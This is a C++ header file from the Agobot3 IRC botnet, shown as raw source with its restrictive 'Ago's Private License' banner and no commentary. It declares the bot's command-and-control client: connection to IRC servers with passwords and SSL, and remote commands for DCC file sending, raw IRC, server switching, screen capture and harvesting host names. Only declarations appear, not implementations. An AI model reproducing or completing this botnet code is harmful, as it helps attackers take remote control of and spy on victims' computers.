/*	Agobot3 - a modular IRC bot for Win32 / Linux
	Copyright (c) 2004 Ago and the Agobot team
	All rights reserved.

	This is private software, you may redistribute it under the terms of
	the APL(Ago's Private License) which follows:
  
	Redistribution and use in binary forms, with or without modification,
	are permitted provided that the following conditions are met:
	1. The name of the author may not be used to endorse or promote products
	   derived from this software without specific prior written permission.
	2. The binary and source may not be sold and/or given away for free.
	3. The licensee may only create binaries for his own usage, not for any
	   third parties.
	4. The person using this sourcecode is a developer of said sourcecode.

	Redistribution and use in source forms, with or without modification,
	are not permitted.

	This license may be changed without prior notice.

	THIS SOFTWARE IS PROVIDED BY THE AUTHOR ``AS IS'' AND ANY EXPRESS OR
	IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE IMPLIED WARRANTIES
	OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE ARE DISCLAIMED.
	IN NO EVENT SHALL THE AUTHOR BE LIABLE FOR ANY DIRECT, INDIRECT,
	INCIDENTAL, SPECIAL, EXEMPLARY, OR CONSEQUENTIAL DAMAGES (INCLUDING, BUT
	NOT LIMITED TO, PROCUREMENT OF SUBSTITUTE GOODS OR SERVICES; LOSS OF USE,
	DATA, OR PROFITS; OR BUSINESS INTERRUPTION) HOWEVER CAUSED AND ON ANY
	THEORY OF LIABILITY, WHETHER IN CONTRACT, STRICT LIABILITY, OR TORT
	(INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY OUT OF THE USE OF
	THIS SOFTWARE, EVEN IF ADVISED OF THE POSSIBILITY OF SUCH DAMAGE. */

#ifndef __IRC_H__
#define __IRC_H__

#include "cstring.h"
#include "commands.h"
#include "message.h"
#include "cthread.h"
#include "sockets.h"

typedef struct irc_server_s
{	cvar	*si_nickprefix;
	cvar	*si_servpass;
	cvar	*si_server;
	cvar	*si_port;
	cvar	*si_chanpass;
	cvar	*si_mainchan;
	cvar	*si_usessl;
} irc_server;

class CIRC : public CThread, public CCommandHandler, public CReply_Iface
{
public:
	CIRC();
	virtual ~CIRC();
	virtual void *Run();

	bool	Init();

	bool	HandleCommand(CMessage *pMsg);

	bool	SendRaw(const char *szMsg);
	bool	SendRawFormat(const char *szFmt, ...);

	void	Fail();
	void	Disconnect();
#ifdef _WIN32
	void ScreenCap();
#endif // _WIN32
	CString	NetInfo();

	bool				m_bConnected;	// Am I connected ?
	bool				m_bJoined;		// Have I joined the channel ?
	bool				m_bRunning;		// Am I still running ?
	CSocket				m_sSocket;		// The socket connected to the server

	unsigned int		m_iFailCount;	// Number of failed connections to the server
	unsigned int		m_iServerNum;	// The current server index in vector
	unsigned long		m_lLastRecv;	// Last recv time for timeout

	CString				m_sLocalHost;	// The local hostname
	CString				m_sLocalIp;		// The local ip
	unsigned long		m_lLocalAddr;	// The local address as unsigned long

	CommandInfo			m_cmdDCCSend, m_cmdDisconnect, m_cmdAction, m_cmdGetEdu, m_cmdGetHost, m_cmdGetEduJoin, m_cmdGetHostJoin, \
						m_cmdJoin, m_cmdMode, m_cmdNetInfo, m_cmdPart, m_cmdPrivMsg, m_cmdQuit, m_cmdRaw, \
						m_cmdReconnect, m_cmdServer, m_cmdScreenCap;

	vector<irc_server*>	m_vServers;
private:
	bool	 SendMsg(bool bSilent, bool bNotice, const char *szMsg, const char *szDst);
};

class CDCC_Handler : public CThread, public CReply_Iface {
public:
			 CDCC_Handler();
	virtual	~CDCC_Handler();

	void	*Run();

	bool	 SendRaw(const char *szMsg);
	bool	 SendRawFormat(const char *szFmt, ...);

	CSocket	*m_pClientSocket;

	CString	 m_sInitiator;
private:
	bool	 SendMsg(bool bSilent, bool bNotice, const char *szMsg, const char *szDst);
};

#endif // __IRC_H__
